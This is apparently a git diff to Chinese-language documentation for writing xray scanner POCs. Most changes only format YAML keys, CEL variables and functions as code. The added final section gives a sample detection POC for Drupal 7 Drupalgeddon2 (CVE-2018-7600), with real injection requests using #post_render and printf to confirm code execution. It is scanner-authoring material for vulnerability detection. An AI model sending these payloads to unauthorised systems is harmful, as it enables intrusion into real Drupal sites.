@@ -21,9 +21,9 @@ rules:
 
 整个POC是一个键值对，其包含3个键：
 
-- name: string
-- rules: []Rule
-- detail: map[string]string
+- `name: string`
+- `rules: []Rule`
+- `detail: map[string]string`
 
 name是POC的名字，我们使用一个英文字母、数字和短横线进行表示，如`poc-yaml-thinkphp523-rce`。
 
@@ -35,23 +35,23 @@ detail是一个键值对，内部存储需要返回给xray引擎的内容，如�
 
 Rule就是我们POC的灵魂，在YAML中一个Rule是一个键值对，其包含如下键：
 
-- method: string 请求方法
-- path: string 请求的完整Path，包括querystring等
-- headers: map[string]string 请求HTTP头，Rule中指定的值会被覆盖到原始数据包的HTTP头中
-- body: string 请求的Body
-- follow_redirects: bool 是否允许跟随300跳转
-- expression: string
-- search: string
+- `method: string` 请求方法
+- `path: string` 请求的完整Path，包括querystring等
+- `headers: map[string]string` 请求HTTP头，Rule中指定的值会被覆盖到原始数据包的HTTP头中
+- `body: string` 请求的Body
+- `follow_redirects: bool` 是否允许跟随300跳转
+- `expression: string`
+- `search: string`
 
 根据这些键的作用，我们将其分为三类：
 
-1. method、path、headers、body、follow_redirects的作用是生成检测漏洞的数据包
-2. expression的作用是判断该条Rule的结果
-3. search的作用是从返回包中提取信息
+1. `method`、`path`、`headers`、`body`、`follow_redirects`的作用是生成检测漏洞的数据包
+2. `expression`的作用是判断该条Rule的结果
+3. `search`的作用是从返回包中提取信息
 
 xray对于POC扫描的流程如下：
 
-POC模块在收到用户的一个请求后，开始对这个目标进行漏洞扫描。根据Rule中的method、path、headers、body、follow_redirects键值，替换原始数据包中的对应信息。
+POC模块在收到用户的一个请求后，开始对这个目标进行漏洞扫描。根据Rule中的`method`、`path`、`headers`、`body`、`follow_redirects`键值，替换原始数据包中的对应信息。
 
 替换后的数据包被发送，并获得返回包，再执行expression表达式，表达式结果作为该条Rule的结果；同时，我们通过search指定的正则表达式，可以从返回包body中提取一些信息，作为下一个rule，或detail中可以被引用的内容。
 
@@ -75,20 +75,20 @@ expression表达式上下文包含的变量暂时只有如下三个，之后会�
 
 变量名 | 类型 | 说明
 ---- | ---- | ----
-status | int | 返回包的status code
-body | []byte | 返回包的Body，因为是一个字节流（bytes）而非字符串，后面判断的时候需要使用字节流相关的方法
-content_type | string | 返回包的content-type头的值
+`status` | `int` | 返回包的status code
+`body` | `[]byte` | 返回包的Body，因为是一个字节流（bytes）而非字符串，后面判断的时候需要使用字节流相关的方法
+`content_type` | `string` | 返回包的content-type头的值
 
 expression表达式上下文包含所有CEL文档中支持的函数，同时还包含xray引擎中自定义的函数，常用的函数如下：
 
 函数名 | 函数原型 | 说明
 ---- | ---- | ----
-contains | `func (s1 string) contains(s2 string) bool` | 判断s1是否包含s2，返回bool类型结果。
-bcontains | `func (b1 bytes) bcontains(b2 bytes) bool` | 判断一个b1是否包含b2，返回bool类型结果。与contains不同的是，bcontains是字节流（bytes）的查找。
-matches | `func (s1 string) matches(s2 string) bool` | 使用正则表达式s1来匹配s2，返回bool类型匹配结果。
-bmatches | `func (s1 string) bmatches(b1 bytes) bool` | 使用正则表达式s1来匹配b1，返回bool类型匹配结果。与matches不同的是，bmatches匹配的是字节流（bytes）。
-startsWith | `func (s1 string) startsWith(s2 string) bool` | 判断s1是否由s2开头
-endsWith | `func (s1 string) endsWith(s2 string) bool` | 判断s1是否由s2结尾
+`contains` | `func (s1 string) contains(s2 string) bool` | 判断s1是否包含s2，返回bool类型结果。
+`bcontains` | `func (b1 bytes) bcontains(b2 bytes) bool` | 判断一个b1是否包含b2，返回bool类型结果。与contains不同的是，bcontains是字节流（bytes）的查找。
+`matches` | `func (s1 string) matches(s2 string) bool` | 使用正则表达式s1来匹配s2，返回bool类型匹配结果。
+`bmatches` | `func (s1 string) bmatches(b1 bytes) bool` | 使用正则表达式s1来匹配b1，返回bool类型匹配结果。与matches不同的是，bmatches匹配的是字节流（bytes）。
+`startsWith` | `func (s1 string) startsWith(s2 string) bool` | 判断s1是否由s2开头
+`endsWith` | `func (s1 string) endsWith(s2 string) bool` | 判断s1是否由s2结尾
 
 值得注意的是，类似于python，CEL中的字符串可以有转义和前缀，如：
 
@@ -159,3 +159,36 @@ expression: |
 ```
 
 此时在YAML层面无需转义。
+
+## 一个示例POC：《Drupal7 drupalgeddon2 命令执行漏洞（CVE-2018-7600）》
+
+这里给出一个样例POC：
+
+```yaml
+name: poc-yaml-drupal-drupalgeddon2-rce
+rules:
+  - method: POST
+    path: "/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]=test%25%25test"
+    headers:
+      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
+    body: |
+      form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password
+    search: |
+      name="form_build_id"\s+value="(.+?)"
+    expression: |
+      status==200
+  - method: POST
+    path: "/?q=file%2Fajax%2Fname%2F%23value%2F{{1}}"
+    headers:
+      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
+    body: |
+      form_build_id={{1}}
+    expression: |
+      body.bcontains(b'test%test')
+detail:
+  drupal_version: 7
+```
+
+该POC分为两个Rule，第一个发送一个POST包，将我们需要的Payload注入缓存中，同时，利用search字段提取缓存ID；第二个数据包，将前面提取的缓存ID`{{1}}`，拼接到body中，触发代码执行漏洞，并使用`body.bcontains(b'test%test')`来判断是否成功执行。
+
+关于这个漏洞的原理，可以参考这篇文章：<https://paper.seebug.org/578/>。
